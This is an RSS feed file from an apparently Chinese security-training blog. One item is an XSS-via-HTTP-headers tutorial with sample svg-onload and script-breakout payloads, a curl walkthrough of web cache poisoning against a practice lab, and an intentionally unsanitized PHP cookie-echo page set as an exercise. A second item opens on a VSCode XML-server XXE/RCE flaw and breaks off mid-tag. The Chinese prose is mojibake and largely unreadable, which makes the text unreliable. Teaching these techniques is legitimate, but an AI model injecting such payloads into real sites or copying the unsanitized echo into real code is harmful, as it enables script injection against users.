<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>äºŒå‘ç®”å®‰å…¨å­¦é™¢</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
<description>å‰æ²¿ã€ä¸“ä¸šçš„ç½‘ç»œç©ºé—´æ”»é˜²å®è®­ ä¸“æ³¨äºæä¾›æœ€å‰æ²¿çš„ç½‘ç»œç©ºé—´å®‰å…¨æ”»é˜²äººæ‰åŸ¹å…»çš„è§£å†³æ–¹æ¡ˆã€‚twosecurity.cn</description>
<language>zh-cn</language>
<lastBuildDate>Sat, 18 Jan 2020 22:23:04 +0800</lastBuildDate>
<item>
<title>åœ¨HTTPå¤´ä¸­è¿›è¡ŒXSS</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-17-103224416.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103224416&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8d9bc030ff73aa70931523b798ba619d_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;è¯´åˆ° XSS ç›¸ä¿¡å¤§å®¶è‚¯å®šéƒ½ä¸é™Œç”Ÿï¼ˆéƒ½ 2020 å¹´äº†ï¼Œè¿˜åœ¨è®² XSS è¿™ç§è€æ‰ç‰™çš„ä¸œè¥¿ï¼‰ï¼Œæœ‰äº›äººç”šè‡³çœ‹åˆ°è¾“å…¥æ¡†å°±æƒ³å¾€é‡Œé¢è¾“ &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥å­¦ä¹  &lt;b&gt;æ€æ ·åœ¨ HTTP å¤´ä¸­è¿›è¡Œ XSS ï¼Ÿ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;ç›´å¥”ä¸»é¢˜ï¼Œå…ˆå‡ ä¸ª XSS çš„ç»å…¸æ¡ˆä¾‹ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&amp;lt;form action=&amp;#34;/xss.php/&amp;#34;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&lt;/li&gt;&lt;li&gt;&amp;lt;p&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;/p&amp;gt;&lt;/li&gt;&lt;li&gt;&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;a&amp;#34; value=&amp;#34;&amp;#34;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;#34;&amp;gt;&lt;/li&gt;&lt;li&gt;&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;a&amp;#34; value=&amp;#34;&amp;#34;&amp;amp;gt;&amp;gt;&amp;lt;svg onload=alert(1)&amp;amp;gt;&amp;#34;&amp;gt;&lt;/li&gt;&lt;li&gt;var test = &amp;#39;&amp;lt;/script&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;#39;;&lt;/li&gt;&lt;li&gt;...&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;å½“ç„¶ï¼Œè¿œä¸æ­¢è¿™äº›ï¼Œæšä¸èƒœä¸¾ã€‚&lt;/p&gt;&lt;p&gt;å…¶ä»–å…³äº XSS çš„çŸ¥è¯†å°±ä¸å¤šè®²äº†ï¼Œæ¯•ç«Ÿæ˜¯è€ç”Ÿå¸¸è°ˆçš„ä¸œè¥¿ï¼Œä¸‹é¢å°±æ¥è®²è®²ä¸ä¸€èˆ¬çš„ XSSã€‚&lt;/p&gt;&lt;h2&gt;HTTPå¤´ä¸­çš„XSS&lt;/h2&gt;&lt;p&gt;å¼€é—¨è§å±±ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ²¡æœ‰æ¸…é™¤åº”ç”¨ç¨‹åº HTTP å¤´ä¸­ä¼ é€’çš„ä¿¡æ¯ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°è¯·æ±‚é¡µé¢çš„æŸä¸ªä½ç½®æ—¶ï¼Œå¯¼è‡´çš„ XSS æƒ…å†µã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;ä¸€ç§æƒ…å†µ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥æ§åˆ¶ HTTP å¤´ä¸­çš„æŸäº›ä¿¡æ¯å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œç„¶ååœ¨åŒä¸€é¡µé¢ä¸­ï¼Œåº”ç”¨ç¨‹åºä¸­çš„å…¶ä»–ä»»ä½•åœ°æ–¹ç”šè‡³åœ¨å¦ä¸€ä¸ªä¸å¯è®¿é—®çš„ç³»ç»Ÿä¸­æ£€ç´¢åˆ°ã€‚ä½†æ˜¯ï¼Œç”±äº CDN å’Œ WAF çš„å­˜åœ¨ï¼Œè¿˜å­˜åœ¨å¦ä¸€ç§éå¸¸æ™®éçš„æƒ…å†µï¼Œæ— éœ€è¿›è¡Œæ•°æ®åº“æ“ä½œå³å¯æŒç»­è¿›è¡Œæ”»å‡»ï¼š&lt;b&gt;Web ç¼“å­˜ä¸­æ¯’&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;å®è·µ&lt;/h2&gt;&lt;p&gt;ç»ƒä¹ åœ°å€ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//brutelogic.com.br/lab/header.php&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;brutelogic.com.br/lab/h&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;eader.php&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;288&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1244&quot; data-original=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;288&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1244&quot; data-original=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?=json_encode(getallheaders()).&amp;#34;\n&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œå‘½ä»¤ curl -iï¼Œå®ƒå‘æˆ‘ä»¬æ˜¾ç¤ºäº†å“åº”çš„ HTTP æ ‡å¤´ä»¥åŠ JSON æ ¼å¼çš„è¯·æ±‚å¤´ã€‚&lt;/p&gt;&lt;blockquote&gt;curl æ˜¯ä¸€ç§å‘½ä»¤è¡Œå·¥å…·ï¼Œä½œç”¨æ˜¯å‘å‡ºç½‘ç»œè¯·æ±‚ï¼Œç„¶åè·å–æ•°æ®ï¼Œæ˜¾ç¤ºåœ¨&amp;#34;æ ‡å‡†è¾“å‡º&amp;#34;ï¼ˆstdoutï¼‰ä¸Šé¢ï¼Œå®ƒæ”¯æŒå¤šç§åè®®ã€‚&lt;br/&gt;-i å‚æ•°å¯ä»¥æ˜¾ç¤º http response çš„å¤´ä¿¡æ¯ï¼Œè¿åŒç½‘é¡µä»£ç ä¸€èµ·ã€‚&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;808&quot; data-original=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;808&quot; data-original=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;ç”±äºå®éªŒé¶åœºçš„ WAF æä¾›äº†æœ€åä¸€ä¸ªæ ‡å¤´ x-sucuri-cacheï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ URL ä¸­æ·»åŠ ä¸€äº›å†…å®¹æ¥é¿å…ç¼“å­˜ï¼Œè¯¥æ ‡å¤´çš„å€¼ä¸º HITï¼Œæ„æ€å°±æ˜¯å®ƒæ¥ç€ WAF çš„ç¼“å­˜ã€‚&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;808&quot; data-original=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;808&quot; data-original=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;å› æ­¤ï¼Œè®¿é—®å¸¦å‚æ•°â€œlolololâ€çš„é¡µé¢ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå¾—åˆ°é¡µé¢çš„éç¼“å­˜ç‰ˆæœ¬ï¼Œæ ‡å¤´ x-sucuri-cache çš„æ ‡å¤´å€¼å˜æˆäº† MISS ã€‚å†æ³¨å…¥è‡ªå·±çš„æ ‡å¤´ï¼ˆä½¿ç”¨å‚æ•° -Hï¼‰ï¼Œä»¥æ£€æŸ¥å®ƒæ˜¯å¦ä»¥å“åº”çš„å½¢å¼å‡ºç°ã€‚&lt;/p&gt;&lt;blockquote&gt;-H --header åœ¨ http request ä¹‹ä¸­ï¼Œè‡ªè¡Œå¢åŠ ä¸€ä¸ªå¤´ä¿¡æ¯ã€‚&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;309&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;309&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;å“åº”æˆåŠŸï¼Œå¾—åˆ°å¸¦æœ‰ Testï¼šmyValue çš„å“åº”ã€‚å†æ›´æ”¹å­—ç¬¦ä¸²ä¸ºâ€œkkkkkâ€å‘å‡ºå¦ä¸€ä¸ªè¯·æ±‚ï¼Œä¸ç„¶å°†è¿”å›å¸¦æœ‰â€œ lolololâ€å­—ç¬¦ä¸²çš„ç¼“å­˜å“åº”ã€‚&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;å†ä½¿ç”¨â€œkkkkkâ€ä½œä¸ºå­—ç¬¦ä¸²æ¥å†æ¬¡å¼€å§‹ç¼“å­˜å¤„ç†ã€‚å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿˜å¸¦å…¥äº† XSS payloadã€‚ä½†ä»…æ˜¯å¯¹è‡ªå·±æœ‰ç”¨ï¼Œå› ä¸ºåªæ˜¯æœ¬æœºç»ˆç«¯å‘é€è¯¥æ ‡å¤´ã€‚payload ä¸ä¼šå‡ºç°åœ¨å…¶ä»–çš„æµè§ˆå™¨è¯·æ±‚ä¸­ã€‚&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;å‘å¦ä¸€ä¸ªè¯·æ±‚ï¼ˆæ³¨æ„çœ‹ data æ—¶é—´ä¸åŒï¼‰ï¼Œè²Œä¼¼æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚è¿™æ˜¯å› ä¸ºç¼“å­˜æœºåˆ¶æ˜¯åŸºäº MISS-MISS-HITï¼Œå› æ­¤ä¸‹ä¸€ä¸ªä¸º MISSã€‚&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;éªŒè¯æ˜¯å¦å·²ç»ç¼“å­˜ï¼Œæ‰“å¼€ç›®æ ‡ URL&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;https://brutelogic.com.br/lab/header.php?kkkkk&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;912&quot; data-rawheight=&quot;273&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;912&quot; data-original=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;912&quot; data-rawheight=&quot;273&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;912&quot; data-original=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;è¯¥ URL å°†ä¿æŒä¸­æ¯’çŠ¶æ€ï¼Œç›´åˆ°ç¼“å­˜è¿‡æœŸï¼Œè¿™å°±æ˜¯ç¼“å­˜æŠ•æ¯’ã€‚&lt;/p&gt;&lt;p&gt;ç»ƒä¹ åœ°å€2ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//brutelogic.com.br/lab/welcome.php&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;brutelogic.com.br/lab/w&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;elcome.php&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;å·¥ä½œåŸç†è·Ÿä¸Šé¢ä¸€æ ·ï¼Œä¸è¿‡æ²¡æœ‰äº†é‚£ä¹ˆæ˜æ˜¾çš„è¾“å‡ºç‚¹ï¼Œæ‰§è¡Œ XSS éœ€è¦å…ˆæ‰¾åˆ°è¾“å‡ºç‚¹ã€‚é¡µé¢çš„æºä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;?php
$name = $_COOKIE[&amp;#34;name&amp;#34;];
if($name){
    echo &amp;#34;&amp;lt;p&amp;gt;Welcome, $name!&amp;lt;/p&amp;gt;\n&amp;#34;;
}else{
    echo &amp;#34;&amp;lt;p&amp;gt;Welcome, guest!&amp;lt;/p&amp;gt;\n&amp;#34;;
}
?&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;å°è¯•è¿›è¡Œ XSS å§ï¼Œå®Œæˆçš„åŒå­¦ï¼Œè¯„è®ºåŒºæ¬¢è¿:)&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;æ¥æºï¼š&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//brutelogic.com.br/blog/xss-via-http-headers/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;brutelogic.com.br/blog/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;xss-via-http-headers/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;çš„ç½‘ç»œå®‰å…¨æŠ€èƒ½åŒ…æ›´æ–°äº†ï¼CISP-PTE è®¤è¯æŠ€èƒ½åŒ…ï¼Œè®©ä½ å…è´¹ä½“éªŒ CISP-PTE è®¤è¯å†…å®¹ã€‚&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æ›´å¤šæœ‰å…³æ¸—é€æµ‹è¯•çš„å†…å®¹è¯·å‰å¾€&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†â€œæŒ–æ´â€ç­ï¼Œæƒ³äº†è§£æ›´å¤šèµ„è®¯çš„ï¼Œå¯å’¨è¯¢å®¢æœå¾®ä¿¡ &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-17-103224416</guid>
<pubDate>Fri, 17 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>åˆ«ä»¥ä¸ºVSCodeå¾ˆå®‰å…¨ğŸ§</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-17-103044773.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103044773&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-96a8fd622af532186aaf65a15caa3bb6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;2019 å¹´ä¸­ï¼ŒXXE æ¼æ´â€œæ¨ªè¡Œâ€ï¼Œç›¸æ¯”ä»¥å¾€è€Œè¨€ï¼ŒXXE æ¼æ´é¢å¤–çš„å¤šã€‚ä¾‹å¦‚ï¼šé€šè¿‡ OpenCMS åˆ©ç”¨ Apache Solr&lt;/p&gt;&lt;p&gt;&lt;b&gt;LSP4XMLï¼ˆXML è¯­è¨€æœåŠ¡å™¨ï¼‰&lt;/b&gt;&lt;/p&gt;&lt;p&gt;æ˜¯ä¸€ä¸ªXMLè¯­è¨€å…·ä½“å®ç°è¯­è¨€æœåŠ¡å™¨åè®®ï¼Œå¯ä¸ä»»ä½•ç¼–è¾‘å™¨ä½¿ç”¨æ”¯æŒè¯¥åè®®ï¼Œä»¥æä¾›è‰¯å¥½çš„æ”¯æŒXMLè¯­è¨€ã€‚&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/angelozerr/lsp4xml&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/angelozerr/l&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;sp4xml&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;ç”¨äºè§£æ VSCode-XML ä¸­çš„ XML æ–‡ä»¶ï¼ŒEclipse çš„ wildwebdeveloperï¼Œtheia-xmlç­‰çš„åº“ã€‚å—åˆ° XXEï¼ˆCVE-2019-18213ï¼‰çš„å½±å“ï¼Œé€šè¿‡æ‰“å¼€æ¶æ„ XML æ–‡ä»¶å¯å¯¼è‡´ RCEï¼ˆCVE-2019-18212ï¼‰è¢«åˆ©ç”¨ã€‚&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;CVE-2019-18213ï¼šXXE &lt;a 